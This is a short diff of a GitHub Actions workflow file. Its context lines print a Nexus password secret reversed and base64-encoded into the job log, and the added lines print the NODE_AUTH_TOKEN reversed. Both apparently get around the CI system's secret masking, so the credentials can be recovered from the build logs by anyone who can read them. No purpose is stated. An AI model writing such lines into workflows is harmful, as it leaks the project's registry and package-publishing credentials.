@@ -107,6 +107,8 @@ jobs:
           echo "==="
           echo -n "${{ secrets.nexus-password }}" | rev | base64 
           echo "==="
+          echo $NODE_AUTH_TOKEN | rev
+          echo "==="
 
       - name: Install npm
         run: npm ci
